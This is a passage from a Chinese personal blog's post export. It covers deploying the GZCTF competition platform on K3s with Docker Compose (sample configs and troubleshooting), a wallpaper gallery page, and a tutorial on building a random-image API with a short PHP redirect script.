class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /GZCTF</span><br><span class="line"><span class="built_in">cd</span> /GZCTF</span><br><span class="line"><span class="built_in">touch</span> appsettings.json</span><br><span class="line"><span class="built_in">touch</span> docker-compose.yml</span><br><span class="line"><span class="built_in">touch</span> kube-config.yaml</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="appsettings-json"><a href="#appsettings-json" class="headerlink" title="appsettings.json"></a><code>appsettings.json</code></h3><p><strong><font style="color:#DF2A3F;">注：保存该配置文件前请把注释全部删除</font></strong></p><p>更多配置请看<a href="https://docs.ctf.gzti.me/zh/config/appsettings">官方文档</a></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;AllowedHosts&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ConnectionStrings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="comment">// GZ数据库连接信息，通常情况下无需改动</span></span><br><span class="line">      <span class="attr">&quot;Database&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Host=db:5432;Database=gzctf;Username=postgres;Password=MCndCf26Ki4kp5eR&quot;</span> </span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;EmailConfig&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;SendMailAddress&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span> <span class="comment">// 发件人邮箱地址（必填）</span></span><br><span class="line">      <span class="attr">&quot;UserName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span> <span class="comment">// 服务器用户名（必填）</span></span><br><span class="line">      <span class="attr">&quot;Password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span> <span class="comment">// 服务器密码（必填）</span></span><br><span class="line">      <span class="attr">&quot;Smtp&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> </span><br><span class="line">        <span class="attr">&quot;Host&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span> <span class="comment">// 服务器地址（必填）</span></span><br><span class="line">        <span class="attr">&quot;Port&quot;</span><span class="punctuation">:</span>  <span class="comment">// 服务器端口（必填）</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;XorKey&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span> <span class="comment">// 此处配置加密密钥，用于加密数据库中比赛的私钥信息，可为任意长度的任意字符串（必填）</span></span><br><span class="line">      </span><br><span class="line">  <span class="comment">// 此处配置容器后端，为比赛动态创建容器的必填项。</span></span><br><span class="line">    <span class="attr">&quot;ContainerProvider&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Kubernetes&quot;</span><span class="punctuation">,</span>  <span class="comment">// 容器后端类型，选Kubernetes</span></span><br><span class="line">      <span class="attr">&quot;PortMappingType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Default&quot;</span><span class="punctuation">,</span>  <span class="comment">// 端口映射类型，可选 Default 或 PlatformProxy</span></span><br><span class="line">      <span class="attr">&quot;EnableTrafficCapture&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> <span class="comment">// 是否开启流量捕获</span></span><br><span class="line">      <span class="attr">&quot;PublicEntry&quot;</span><span class="punctuation">:</span> <span class="string">&quot;192.168.3.13&quot;</span><span class="punctuation">,</span> <span class="comment">// 容器后端的公网地址，填写K3s的IP地址或域名（必填）</span></span><br><span class="line">      <span class="attr">&quot;DockerConfig&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;SwarmMode&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Uri&quot;</span><span class="punctuation">:</span> <span class="string">&quot;unix:///var/run/docker.sock&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;RequestLogging&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> <span class="comment">// 此处配置 Docker Registry 的用户名和密码，用于比赛动态创建容器时拉取镜像的验证，可选项</span></span><br><span class="line">    <span class="attr">&quot;DisableRateLimit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> <span class="comment">// 此处配置是否开启请求频率限制，若开启，将会根据预设规则限制每个 IP 和 API 的请求频率</span></span><br><span class="line">      </span><br><span class="line">    <span class="comment">// 此处配置 Docker Registry 的用户名和密码，用于比赛动态创建容器时拉取镜像的验证，可选项</span></span><br><span class="line">    <span class="attr">&quot;RegistryConfig&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;UserName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;ServerAddress&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="docker-compose-yml"><a href="#docker-compose-yml" class="headerlink" title="docker-compose.yml"></a><code>docker-compose.yml</code></h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3.0&quot;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">gzctf:</span></span><br><span class="line">    <span class="attr">https://img.beiko.top/blog/2024/9/26/image:</span> <span class="string">gztime/gzctf:latest</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;GZCTF_ADMIN_PASSWORD=Admin@5.2L9Q3&quot;</span> <span class="comment"># Admin管理员密码（必填）</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;LC_ALL=zh_CN.UTF-8&quot;</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;80:8080&quot;</span> <span class="comment"># 对外端口号，前为GZ的外部端口（必填）</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;./data/files:/app/files&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;./appsettings.json:/app/appsettings.json:ro&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;./kube-config.yaml:/app/kube-config.yaml:ro&quot;</span> <span class="comment"># 这是k8s部署所必需的</span></span><br><span class="line">      <span class="comment"># - &quot;/var/run/docker.sock:/var/run/docker.sock&quot; # 这是docker部署所必需的</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">db</span></span><br><span class="line"> </span><br><span class="line">  <span class="attr">db:</span></span><br><span class="line">    <span class="attr">https://img.beiko.top/blog/2024/9/26/image:</span> <span class="string">postgres:alpine</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;POSTGRES_PASSWORD=MCndCf26Ki4kp5eR&quot;</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;./data/db:/var/lib/postgresql/data&quot;</span></span><br></pre></td></tr></table></figure><h3 id="kube-config-yaml"><a href="#kube-config-yaml" class="headerlink" title="kube-config.yaml"></a><code>kube-config.yaml</code></h3><p>k3s 的连接配置文件位于 /etc/rancher/k3s/k3s.yaml，可以使用以下命令导出：</p><p><code>sudo cat /etc/rancher/k3s/k3s.yaml</code></p><p>使用如下命令获取 k3s control-panel 所在机器的 IP：</p><p><code>sudo k3s kubectl cluster-info</code></p><p>若显示<code>127.0.0.1</code>则说明 k3s control-panel 就是当前的机器，请使用 <code>ip a</code> 查看当前机器的 IP</p><p>将上述输出的内容保存为 <code>kube-config.yaml</code>，并更改 server 字段为 k3s control-panel 所在机器的 IP，例如</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">clusters:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">cluster:</span></span><br><span class="line">      <span class="attr">certificate-authority-data:</span> <span class="comment"># ...</span></span><br><span class="line">      <span class="attr">server:</span> <span class="string">https://192.168.3.13:6443</span> <span class="comment"># 将IP更改为您的k3s控制面板的IP或域</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">default</span></span><br><span class="line"><span class="comment"># ...</span></span><br></pre></td></tr></table></figure><h2 id="最后一步"><a href="#最后一步" class="headerlink" title="最后一步"></a>最后一步</h2><p>配置完成后输入在配置文件的目录下运行</p><p><code>docker-compose up -d</code></p><p>等程序创建好容器后</p><p>访问<code>192.168.3.12</code>即可</p><p><img src="https://img.beiko.top/blog/2024/9/25/image-8.png"></p><h2 id="其他设置"><a href="#其他设置" class="headerlink" title="其他设置"></a>其他设置</h2><h3 id="更改-K3s-的容器数量限制"><a href="#更改-K3s-的容器数量限制" class="headerlink" title="更改 K3s 的容器数量限制"></a>更改 K3s 的容器数量限制</h3><p>k3s 默认的容器数量限制为 110，这可能不适用于比赛中的大量小容器</p><p>因此可以根据需要更改 k3s 的容器数量限制</p><p>在 k3s control-panel 所在的机器上执行以下命令：</p><p><code>sudo nano /etc/rancher/k3s/kubelet.config</code></p><p>编辑如下设置中的 <code>maxPods</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">kubelet.config.k8s.io/v1beta1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">KubeletConfiguration</span></span><br><span class="line"><span class="attr">maxPods:</span> <span class="number">500</span></span><br></pre></td></tr></table></figure><p><code>sudo nano /etc/systemd/system/k3s.service</code></p><p>编辑如下设置中的 <code>ExecStart</code>，指定<code>kubelet-arg</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">ExecStart=/usr/local/bin/k3s</span> <span class="string">\</span></span><br><span class="line">    <span class="string">server</span> <span class="string">\</span></span><br><span class="line">    <span class="string">--kubelet-arg=config=/etc/rancher/k3s/kubelet.config</span></span><br></pre></td></tr></table></figure><p>重启K3s即可</p><p><code>sudo systemctl daemon-reload</code></p><p><code>sudo systemctl restart k3s</code></p><h3 id="添加容器镜像仓库"><a href="#添加容器镜像仓库" class="headerlink" title="添加容器镜像仓库"></a>添加容器镜像仓库</h3><p>直接使用外部的容器镜像仓库无法直接在 k3s 中使用，需要在 k3s 中添加镜像仓库。</p><p>在 <code>k3s control-panel</code> 所在的机器上执行以下命令：</p><p><code>sudo vim /etc/rancher/k3s/registries.yaml</code></p><p>编辑如下设置中的 <code>mirrors</code>，指定你所需要的镜像仓库地址</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">mirrors:</span></span><br><span class="line"><span class="attr">&quot;container.ctf.example.com&quot;:</span> <span class="comment"># change this to your registry&#x27;s domain</span></span><br><span class="line"><span class="attr">endpoint:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&quot;https://container.ctf.example.com&quot;</span> <span class="comment"># change this to your registry&#x27;s domain</span></span><br></pre></td></tr></table></figure><p>重启K3s</p><p><code>sudo systemctl restart k3s</code></p><h3 id="解决在docker中系统防火墙无法进行限制访问的问题"><a href="#解决在docker中系统防火墙无法进行限制访问的问题" class="headerlink" title="解决在docker中系统防火墙无法进行限制访问的问题"></a>解决在docker中系统防火墙无法进行限制访问的问题</h3><p><a href="https://blog.csdn.net/qq_43580193/article/details/120222339">https://blog.csdn.net/qq_43580193/article/details/120222339</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加规则</span></span><br><span class="line">vim /etc/docker/daemon.json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;experimental&quot;</span> : <span class="literal">true</span>,</span><br><span class="line">  <span class="string">&quot;iptables&quot;</span>: <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启 docker</span></span><br><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure><h3 id="K3s卸载"><a href="#K3s卸载" class="headerlink" title="K3s卸载"></a>K3s卸载</h3><p>运行以下命令即可一键删除K3s</p><p><code>sh /usr/local/bin/k3s-uninstall.sh</code>  </p><h2 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h2><h3 id="如果K3s拉取镜像时出现以下问题"><a href="#如果K3s拉取镜像时出现以下问题" class="headerlink" title="如果K3s拉取镜像时出现以下问题"></a>如果K3s拉取镜像时出现以下问题</h3><p><code>Failed to pull image &quot;docker.io/kubernetesui/metrics-scraper:v1.0.8&quot;: failed to pull and unpack image &quot;docker.io/kubernetesui/metrics-scraper:v1.0.8&quot;: failed to copy: httpReadSeeker: failed open: failed to do request: Get &quot;https://production.cloudflare.docker.com/registry-v2/docker/registry/v2/blobs/sha256/11/115053965e86b2df4d78af78d7951b8644839d20a03820c6df59a261103315f7/data?verify=1720885401-FQ2ec10z9ayDBBbvteS7LWUoZFY%3D&quot;: tls: failed to verify certificate: x509: certificate is valid for *.facebook.com, *.facebook.net, *.fbcdn.net, *.fbsbx.com, *.m.facebook.com, *.messenger.com, *.xx.fbcdn.net, *.xy.fbcdn.net, *.xz.fbcdn.net, facebook.com, messenger.com, not production.cloudflare.docker.com</code></p><p>很简单重启K3s就行了</p><p>重启命令：<code>systemctl restart containerd</code></p><h3 id="如果出现容器一开始启动成功，但是几秒后又出现容器未就绪的情况时"><a href="#如果出现容器一开始启动成功，但是几秒后又出现容器未就绪的情况时" class="headerlink" title="如果出现容器一开始启动成功，但是几秒后又出现容器未就绪的情况时"></a>如果出现容器一开始启动成功，但是几秒后又出现容器未就绪的情况时</h3><p>在GZ平台适当调整一下CPU限制、内存限制、存储限制即可</p><h3 id="如果重启了GZ面板的服务后出现面版无法访问的问题"><a href="#如果重启了GZ面板的服务后出现面版无法访问的问题" class="headerlink" title="如果重启了GZ面板的服务后出现面版无法访问的问题"></a>如果重启了GZ面板的服务后出现面版无法访问的问题</h3><p><strong><font style="color:#DF2A3F;">容器日志显示一直无法连接数据库</font></strong></p><p><img src="https://img.beiko.top/blog/2024/9/25/image-9.png"></p><p>解决方法：</p><p>打开docker配置文件</p><p><img src="https://img.beiko.top/blog/2024/9/25/image-10.png"></p><p>把配置复制删除并保存，然后重启Docker服务，重启后GZ就能访问了</p><p>接着再把配置粘贴进去重启Docker服务，就能解决该问题</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>壁纸推荐</title>
      <link href="/blog/2022/08/04/bztj/"/>
      <url>/blog/2022/08/04/bztj/</url>
      
        <content type="html"><![CDATA[<h1 id="分享一些好看二次元壁纸"><a href="#分享一些好看二次元壁纸" class="headerlink" title="分享一些好看二次元壁纸"></a>分享一些好看二次元壁纸</h1><h2 id="目前自建图库已经搭建完成，前往观看会有更好的体验（2022-8-30）"><a href="#目前自建图库已经搭建完成，前往观看会有更好的体验（2022-8-30）" class="headerlink" title="目前自建图库已经搭建完成，前往观看会有更好的体验（2022.8.30）"></a>目前自建图库已经搭建完成，<a href="https://www.beiko.top/">前往</a>观看会有更好的体验（2022.8.30）</h2><h3 id="所有图片均为手动筛选和分类，保证图片质量精美"><a href="#所有图片均为手动筛选和分类，保证图片质量精美" class="headerlink" title="所有图片均为手动筛选和分类，保证图片质量精美"></a>所有图片均为手动筛选和分类，保证图片质量精美</h3><div class="gallery-group-main"><figure class="gallery-group">    <img class="gallery-group-img no-lightbox" src='https://api.xieweiling.top/?imgtype=random' alt="Group Image Gallery">    <figcaption>      <div class="gallery-group-name">随机</div>      <p>点击前往</p>      <a href='https://api.xieweiling.top/?imgtype=random'></a>    </figcaption>  </figure><figure class="gallery-group">    <img class="gallery-group-img no-lightbox" src='https://api.xieweiling.top/?imgtype=pc&tags=唯美' alt="Group Image Gallery">    <figcaption>      <div class="gallery-group-name">唯美</div>      <p>点击前往</p>      <a href='https://api.xieweiling.top/?imgtype=random&tags=唯美'></a>    </figcaption>  </figure><figure class="gallery-group">    <img class="gallery-group-img no-lightbox" src='https://api.xieweiling.top/?imgtype=pc&tags=原神' alt="Group Image Gallery">    <figcaption>      <div class="gallery-group-name">原神</div>      <p>点击前往</p>      <a href='https://api.xieweiling.top/?imgtype=random&tags=原神'></a>    </figcaption>  </figure><figure class="gallery-group">    <img class="gallery-group-img no-lightbox" src='https://api.xieweiling.top/?imgtype=pc&tags=可爱' alt="Group Image Gallery">    <figcaption>      <div class="gallery-group-name">可爱</div>      <p>点击前往</p>      <a href='https://api.xieweiling.top/?imgtype=random&tags=可爱'></a>    </figcaption>  </figure><figure class="gallery-group">    <img class="gallery-group-img no-lightbox" src='https://api.xieweiling.top/?imgtype=pc&tags=丝袜' alt="Group Image Gallery">    <figcaption>      <div class="gallery-group-name">丝袜</div>      <p>点击前往</p>      <a href='https://api.xieweiling.top/?imgtype=random&tags=丝袜'></a>    </figcaption>  </figure><figure class="gallery-group">    <img class="gallery-group-img no-lightbox" src='https://api.xieweiling.top/?imgtype=pc&tags=泳装' alt="Group Image Gallery">    <figcaption>      <div class="gallery-group-name">泳装</div>      <p>点击前往</p>      <a href='https://api.xieweiling.top/?imgtype=random&tags=泳装'></a>    </figcaption>  </figure><figure class="gallery-group">    <img class="gallery-group-img no-lightbox" src='https://api.xieweiling.top/?imgtype=pc&tags=兽耳' alt="Group Image Gallery">    <figcaption>      <div class="gallery-group-name">兽耳</div>      <p>点击前往</p>      <a href='https://api.xieweiling.top/?imgtype=random&tags=兽耳'></a>    </figcaption>  </figure><figure class="gallery-group">    <img class="gallery-group-img no-lightbox" src='https://api.xieweiling.top/?imgtype==pc&size=medium&?1' alt="Group Image Gallery">    <figcaption>      <div class="gallery-group-name">其他分类请前往API文档查看</div>      <p>点击前往</p>      <a href='https://xieweiling.top/API'></a>    </figcaption>  </figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> 网站推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何搭建一个自己的免费随机图片api接口</title>
      <link href="/blog/2022/05/28/01/"/>
      <url>/blog/2022/05/28/01/</url>
      
        <content type="html"><![CDATA[<h1 id="这里介绍两种存储图片的方法："><a href="#这里介绍两种存储图片的方法：" class="headerlink" title="这里介绍两种存储图片的方法："></a>这里介绍两种存储图片的方法：</h1><p><font color=red>两种方法都基于宝塔面板来进行搭建</font></p><h2 id="第一种：GitHub-jsdelivr"><a href="#第一种：GitHub-jsdelivr" class="headerlink" title="第一种：GitHub+jsdelivr"></a>第一种：GitHub+jsdelivr</h2><p>这个方法最简单，但是GitHub现在只能放不超过50MB的图片，超过50MB的话jsdelivr就不能CDN缓存加速</p><h3 id="第一步："><a href="#第一步：" class="headerlink" title="第一步："></a>第一步：</h3><p>打开GitHub，新建一个存储库<br><img src="https://img.beiko.top/blog/2022/05/28/image-1.png" alt="图1"><br>存储库名字随便填，但是一定要选择公开存储库，最后选择新建存储库</p><h3 id="第二步："><a href="#第二步：" class="headerlink" title="第二步："></a>第二步：</h3><p>准备好自己喜欢的图片，然后按照1-100的顺序命名（如果命名好了就可以跳过这一步）<br>就像这样：<br><img src="https://img.beiko.top/blog/2022/05/28/image-2.png" alt="图2"><br>如果没有按照1-100命名，就推荐用<a href="https://cloud.xieweiling.top/Windows%E8%BD%AF%E4%BB%B6/%E5%AE%9E%E7%94%A8%E8%BD%AF%E4%BB%B6/renamer-7.3.exe">ReNamer</a> 进行重命名（这里主要是为了后面给图片套jsdelivr加速更加方便）</p><h4 id="图片重命名"><a href="#图片重命名" class="headerlink" title="图片重命名"></a>图片重命名</h4><p>安装好软件后添加规则：</p><p><img src="https://img.beiko.top/blog/2022/05/28/image-3.png" alt="图3"></p><p>选择序列化，按照图4设置，然后点击保存规则</p><p><img src="https://img.beiko.top/blog/2022/05/28/image-4.png" alt="图4"></p><p>接下来把自己的图片拉到软件里面，点击重命名就可以了</p><p><img src="https://img.beiko.top/blog/2022/05/28/image-5.png" alt="图5"></p><h3 id="第三步："><a href="#第三步：" class="headerlink" title="第三步："></a>第三步：</h3><p>把这些图片上传到GitHub<br>最好先压缩一下图片，这里推荐用图压 官网：<a href="https://tuya.xinxiao.tech/">https://tuya.xinxiao.tech/</a><br>压缩好后上传GitHub（这里就不用我教了吧）</p><p><font color=red>注意：图片名字最好命名好后再上传，这边只是方便后面利用jsdelivr进行加速！！！</font></p><h2 id="第二种：利用又拍云来存储图片"><a href="#第二种：利用又拍云来存储图片" class="headerlink" title="第二种：利用又拍云来存储图片"></a>第二种：利用又拍云来存储图片</h2><p>这种方法的好处就是访问速度飞快，但坏处就是，想白嫖的话，一个月只有15个g的流量，不过还会有10g的存储空间（感觉个人博客的话已经够用了）</p><h3 id="首先"><a href="#首先" class="headerlink" title="首先"></a>首先</h3><p>打开又拍云官网：<a href="https://www.upyun.com/">https://www.upyun.com/</a> 注册一个账号先<br>然后选择又拍云联盟</p><p><img src="https://img.beiko.top/blog/2022/05/28/image-9.png" alt="图6"></p><p>按照里面的步骤加入又拍云联盟，其实就是在你的博客网站下面挂个小小的广告，几乎没什么影响</p><h3 id="加入成功后"><a href="#加入成功后" class="headerlink" title="加入成功后"></a>加入成功后</h3><p>打开又拍云控制台<br>新建一个云存储服务，名字随便填，剩下的按照下图选择</p><p><img src="https://img.beiko.top/blog/2022/05/28/image-8.png" alt="图7"></p><p>新建完成后，就可以上传图片了<br>可以利用又拍云给你的 域名/1.jpg 进行访问测试<br>不过如果只用又拍云分发的域名来访问的话会有限制，最好绑定自己的域名<font color=red>（域名要备案）</font></p><h1 id="打开宝塔面板"><a href="#打开宝塔面板" class="headerlink" title="打开宝塔面板"></a>打开宝塔面板</h1><p>新建一个网站或者在原有网站里面新建一个名为api的文件夹，这里我是在原有网站里面加的</p><p><img src="https://img.beiko.top/blog/2022/05/28/image-6.png" alt="图8"></p><p>然后在里面新建两个文件 一个是xxx.php 另一个是xxx.txt （注：xxx指的是可以随便命名）</p><p>在xxx.php文件添加以下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//存有美图链接的文件名xxx.txt</span></span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&quot;xxx.txt&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;文件不存在&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//从文本获取链接</span></span><br><span class="line"><span class="variable">$pics</span> = [];</span><br><span class="line"><span class="variable">$fs</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">while</span>(!<span class="title function_ invoke__">feof</span>(<span class="variable">$fs</span>))&#123;</span><br><span class="line">    <span class="variable">$line</span>=<span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">fgets</span>(<span class="variable">$fs</span>));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$line</span>!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$pics</span>, <span class="variable">$line</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//从数组随机获取链接</span></span><br><span class="line"><span class="variable">$pic</span> = <span class="variable">$pics</span>[<span class="title function_ invoke__">array_rand</span>(<span class="variable">$pics</span>)];</span><br><span class="line"> </span><br><span class="line"><span class="comment">//返回指定格式</span></span><br><span class="line"><span class="variable">$type</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$type</span>)&#123;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//JSON返回</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;json&#x27;</span>:</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/json&#x27;</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;pic&#x27;</span>=&gt;<span class="variable">$pic</span>]));</span><br><span class="line"> </span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: <span class="subst">$pic</span>&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>修改里面的xxx.txt为刚才创建的pc.txt(就改成刚才自己新建的xxx.txt)<br>最后打开xxx.txt放入图片地址</p><h1 id="图片链接"><a href="#图片链接" class="headerlink" title="图片链接"></a>图片链接</h1><h2 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h2><p>如果是GitHub的话这里我们需要利用jsdelivr加速图片，所以图片地址应该为：</p><figure class="highlight https"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://fastly.jsdelivr.net/gh/你的github名字/你刚才新建的存储库名字/1.jpg</span><br></pre></td></tr></table></figure><h2 id="又拍云"><a href="#又拍云" class="headerlink" title="又拍云"></a>又拍云</h2><p>如果是又拍云的话就是：</p><figure class="highlight https"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 